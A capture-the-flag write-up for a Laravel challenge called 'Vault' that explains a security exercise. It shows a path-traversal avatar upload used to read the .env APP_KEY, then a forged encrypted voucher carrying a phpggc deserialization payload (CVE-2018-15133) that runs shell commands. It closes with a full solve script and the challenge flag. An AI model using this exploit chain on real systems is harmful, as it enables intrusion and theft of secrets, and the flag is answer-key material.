## Vault  

<img src="images/chall.png" width=600>

We are given a website built with PHP and Laravel. 

<img src="images/website.png" width=800>

The server has a number of endpoints, but the main functionalities lie in the `/account` and `/vouchers` endpoints and their sub-endpoints.  

```php
Route::middleware(['auth'])->group(function() {
    Route::get('/', [DashboardController::class, 'index'])->name('dashboard');
    Route::get('/account', [AccountController::class, 'index'])->name('account');
    Route::get('/mining', [MiningController::class, 'index'])->name('mining');
    Route::get('/vouchers', [VouchersController::class, 'index'])->name('vouchers');
    Route::get('/transactions', [TransactionsController::class, 'index'])->name('transactions');
    Route::get('/avatar', [AccountController::class, 'getAvatar']);

    Route::post('/account', [AccountController::class, 'update']);
    Route::post('/account/avatar', [AccountController::class, 'updateAvatar']);
    Route::post('/mining/collect', [MiningController::class, 'collect']);
    Route::post('/transactions', [TransactionsController::class, 'send']);
    Route::post('/vouchers', [VouchersController::class, 'create']);
    Route::post('/vouchers/redeem', [VouchersController::class, 'redeem']);
});

Route::get('/login', [AuthController::class, 'index'])->name('login');
Route::get('/register', [AuthController::class, 'index'])->name('register');
Route::get('/logout', [AuthController::class, 'index'])->name('logout');

Route::post('/login', [AuthController::class, 'auth']);
Route::post('/register', [AuthController::class, 'register']);

Route::delete('/logout', [AuthController::class, 'logout']);
```

In `entrypoint.sh`, we can see that the challenge Docker container is created with a `/tmp/flag.txt`, but the flag file is renamed to have a random hex prefix.  

```bash
#!/bin/sh
set -e

php artisan key:generate --force
php artisan config:cache
php artisan route:cache
php artisan view:cache

touch database/database.sqlite
chown www-data:www-data database/database.sqlite
php artisan migrate --force

mv /tmp/flag.txt /$(openssl rand -hex 12)-flag.txt

exec "$@"
```

Looking at `AccountController.php`, we can actually spot a vulnerability. `updateAvatar()` allows us to supply an image, but the image name isn't sanitised and is used in `getAvatar()` to serve a file via `response()->file()`, allowing us to perform path traversal and LFI.  

```php
class AccountController extends Controller 
{
    ...

    public function updateAvatar(Request $request)
    {
        $request->validate([
            'avatar' => 'required|image|max:2048'
        ]);

        /** @var \App\Models\User $user */
        $user = Auth::user();
        
        if ($user->avatar) {
            $previousPath = Storage::disk('public')->path($user->avatar);
            if (file_exists($previousPath))
                unlink($previousPath);
        }

        $name = $_FILES['avatar']['full_path'];
        $path = "/var/www/storage/app/public/avatars/$name";
        $request->file('avatar')->storeAs('avatars', basename($name), 'public');

        $user->avatar = $path;
        $user->save();

        return redirect()->back();
    }

    public function getAvatar(Request $request)
    {
        $path = Auth::user()->avatar;

        if (!$path)
            return response()->json(['error' => 'No avatar set.']);

        return response()->file($path);
    }
}
```

However, since the flag file prefix is randomised, we don't know its exact path and can't use LFI to directly read the flag file.  

Looking at `VouchersController.php`, we can spot another critical vulnerability.  The `/vouchers/redeem` endpoint blindly trusts whatever voucher token we supply to it and decrypts it using the `decrypt()` function from `Illuminate\Contracts\Encryption\Encrypter`.  

`decrypt()` is known to be susceptible to [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/cve-2018-15133). `decrypt()` deserializes the data under the hood, and a specially crafted payload can exploit this to achieve RCE.  

```php
class VouchersController extends Controller
{
    ...

    public function redeem(Request $request)
    {
        $data = $request->validate([
            'voucher' => 'required|string'
        ]);

        try {
            $voucher = decrypt($data['voucher']);
        } catch (DecryptException $e) {
            return back()->withErrors([
                'voucher' => 'Invalid voucher.'
            ]);
        }

        /** @var \App\Models\User $user */
        $user = Auth::user();
        $user->balance += $voucher['amount'];
        $user->save();

        return redirect()->back();
    }
}
```

To exploit this CVE, we first need the application key which the server uses to sign legitimate voucher tokens.  

We can use our LFI vuln from earlier to get our avatar path to point to `/var/www/.env`.  

```python
PNG = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\nIDATx\x9cc`\x00\x00\x00\x02\x00\x01\xe2!\xbc3\x00\x00\x00\x00IEND\xaeB`\x82"

res = s.post(f'{url}/account/avatar', files = {
    "avatar": (
        f"../../../../../../../../../../var/www/.env",
        PNG,
        "image/png",
    )
}, data={
    '_token': get_token('account')  # csrf verification bypass
})

res = s.get(f'{url}/avatar')
```

Visiting `/avatar` will then fetch and display the server environment variables, with `APP_KEY` inside.  

<img src="images/env.png" width=800>

We can then use `phpggc` to generate an RCE payload that executes `ls /`, then reproduce the Laravel encryption logic to generate a malicious voucher token.  

```python
key = base64.b64decode(app_key)
iv = os.urandom(16)

payload = subprocess.check_output(["php", "./phpggc/phpggc", "Laravel/RCE9", "system", 'ls /'])

cipher = AES.new(key, AES.MODE_CBC, iv)
value = base64.b64encode(cipher.encrypt(pad(payload, 16))).decode()
iv_b64 = base64.b64encode(iv).decode()

mac = hmac.new(key, (iv_b64 + value).encode(), hashlib.sha256).hexdigest()

payload = base64.b64encode(json.dumps({
    "iv": iv_b64,
    "value": value,
    "mac": mac,
    "tag": ""
}).encode()).decode()

print(payload)
```

Redeeming our voucher in the `/vouchers` endpoint will trigger the deserialization RCE and list the entire root directory, revealing the filename of the flag file.  

<img src="images/rce.png" width=800>

We can then modify our payload to `cat` the flag file.  

<img src="images/flag.png" width=800>

Below is my full solve script for this challenge.  

```python
import requests
import re
import subprocess
import base64, json, os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import hmac, hashlib

url = "https://b6f18396-06fb-46db-bbce-3fa4ff44b2a7.tamuctf.com"
s = requests.Session()

creds = {
    'username': 'hacked',
    'password': 'hacked',
    'password2': 'hacked'
}

# login
def get_token(endpoint):
    res = s.get(f'{url}/{endpoint}')

    return re.findall(r'"_token" value="(.+)" auto', res.text)[0].strip() 

res = s.post(f'{url}/register', data={
    **creds,
    '_token': get_token('register')
})

res = s.post(f'{url}/login', data={
    **creds,
    '_token': get_token('login')
})

if "welcome" in res.text.lower():
    print("> Logged in")

# lfi
def lfi(file):
    PNG = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\nIDATx\x9cc`\x00\x00\x00\x02\x00\x01\xe2!\xbc3\x00\x00\x00\x00IEND\xaeB`\x82"

    res = s.post(f'{url}/account/avatar', files = {
        "avatar": (
            f"../../../../../../../../../../{file}",
            PNG,
            "image/png",
        )
    }, data={
        '_token': get_token('account')
    })

    res = s.get(f'{url}/avatar')
    return res.content

app_key = re.findall(r'APP_KEY=base64:(.+)', lfi("/var/www/.env").decode())[0].strip()
print("App key:", app_key)

# rce
def get_voucher(cmd):
    key = base64.b64decode(app_key)
    iv = os.urandom(16)

    payload = subprocess.check_output(["php", "./phpggc/phpggc", "Laravel/RCE9", "system", cmd])

    cipher = AES.new(key, AES.MODE_CBC, iv)
    value = base64.b64encode(cipher.encrypt(pad(payload, 16))).decode()
    iv_b64 = base64.b64encode(iv).decode()

    mac = hmac.new(key, (iv_b64 + value).encode(), hashlib.sha256).hexdigest()

    payload = base64.b64encode(json.dumps({
        "iv": iv_b64,
        "value": value,
        "mac": mac,
        "tag": ""
    }).encode()).decode()

    return payload

def rce(cmd):
    res = s.post(f"{url}/vouchers/redeem", data={
        'voucher': get_voucher(cmd),
        '_token': get_token('vouchers')
    })

    return res.text

flag_file = re.findall(r'(.+-flag.txt)', rce('ls /'))[0]
print("Flag path:", flag_file)

leak = rce(f'cat /{flag_file}')

flag = re.findall(r'(gigem{.+})', leak)[0]
print("Flag:", flag)
```

Flag: `gigem{142v31_d3c2yp7_15_d4n9320u5_743f9c}`